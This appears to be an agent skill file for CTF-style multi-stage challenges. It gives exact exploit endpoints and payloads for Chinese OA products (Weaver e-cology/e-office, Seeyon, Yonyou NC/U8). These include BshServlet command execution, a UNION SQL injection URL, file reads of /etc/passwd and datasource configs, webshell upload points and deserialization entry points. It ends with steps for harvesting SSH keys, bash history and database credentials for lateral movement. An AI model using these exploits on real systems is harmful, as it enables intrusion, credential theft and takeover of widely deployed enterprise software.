name: oa-product-cve
description: Exploit knowledge for Chinese OA products (泛微 Weaver e-cology/e-office, 致远 Seeyon, 用友 NC/U8). The b-series multi-stage challenges pivot on an OA system at stage 2 — this gives the exact CVE/endpoint to turn an OA box into RCE or admin, plus how to jump past login/captcha to the backend API. "Know the endpoint = instant stage clear".
---

# OA Product CVE (泛微 / 致远 / 用友)

Authorized CTF/assessment use. OA systems are the "bridge" host in multi-stage challenges. Identify the product, hit its known endpoint, get RCE or admin, then harvest credentials for lateral movement. Do NOT fight the login/captcha — go around it with these endpoints.

## 1. 泛微 Weaver e-cology

**Fingerprint:** URL paths `/seeyon/`(no, that's 致远), `/weaver/`, `/ecology/`; page title "泛微" / "Weaver"; `/wui/`, `/mobile/` present.

**Instant RCE — BshServlet (if reachable):**
```
POST /weaver/bsh.servlet.BshServlet  (or /ecology/bsh.servlet.BshServlet)
bsh.script=exec("id");&bsh.servlet.output=true
```
**E-cology 9 SQLi (front, no auth):**
```
GET /mobile/plugin/WorkflowCenterTreeData.jsp?scope=mobile&node=wftype_1%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+
```
This leaks DB → extract admin password hashes / OA user table (the "查 OA 凭据" path).

**E-cology 9 SSRF / arbitrary file read:**
```
/mobile/plugin/1.jsp  (traversal to /etc/passwd, config, ecology.properties)
```
`ecology.properties` leaks the DB datasource (`jdbc:...` user/pass) → connect to the OA DB directly and dump the user table (skip the login form entirely).

**E-cology file upload (older, 8/9):** `/weaver/weaver.file.FileDownloadForOutDoc` + `FileUpload` path → webshell.

**e-office upload (泛微 E-office):** `/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save` — unrestricted upload → webshell.

**Priority when blocked on login/captcha:** (1) BshServlet RCE if reachable; (2) SQLi on `WorkflowCenterTreeData.jsp` → DB creds → direct DB query of the user table; (3) SSRF read `ecology.properties` → datasource creds → direct DB. The DB is the cheat-code: it holds the OA accounts + hashes, bypassing captcha entirely.

## 2. 致远 Seeyon OA

**Fingerprint:** paths `/seeyon/`, `/seeyon/htmlofficeservlet`, `/seeyon/ajax.do`; title "致远" / "Seeyon".

**Instant RCE — htmlofficeservlet (A6/A8):**
```
POST /seeyon/htmlofficeservlet
DBSTEP V3.0     389     0       0       ... + Java serialized payload
```
(Often needs a pre-built serialized exploit; check for the common A6/A8 gadget chain.)

**File upload / RCE — ajax.do (A8):**
```
POST /seeyon/ajax.do?method=ajaxAction&managerName=... 
```
(known methods: `managerName=passwordManager` / arbitrary file write chains)

**SQLi / info leak:** `/seeyon/thirdparty/...`, `/seeyon/rest/` token endpoints.

## 3. 用友 NC / U8

**Fingerprint:** paths `/nc/`, `/u8/`, `/servlet/~ic/`, `/ServiceDispatcherServlet`; title "用友".

**Instant RCE — NC BshServlet (same bsh trick):**
```
POST /servlet/~ic/bsh.servlet.BshServlet
bsh.script=exec("id");
```
**NC 6.5 deserialization:** `/servlet/~uap/` + serialized Java payload (CC gadget).
**U8 CRM SQLi / upload:** `/u8/crm/` endpoints; `ajaxfileupload` / `webservices` known upload points.

## Cross-cutting for OA stage (multi-stage flag 2/3)
1. **Bypass, don't brute-force.** Captcha/hardcoded login blocks the FORM — the goal is the DB or an RCE endpoint, not the login page.
2. **DB is the cheat-code.** Every OA leaks a datasource config (`ecology.properties`, `/WEB-INF/classes/*.properties`, JSP source). Once you have the DB creds, query the user table directly for accounts/hashes → lateral.
3. **RCE → credential harvest.** After shell, read `~/.ssh`, `authorized_keys`, app config, bash_history — the OA host is the SSH bridge to the core system (flag 3/4).
4. **Self-verify each stage** before moving on: confirm RCE with `id`, confirm DB read with a row count, then proceed.
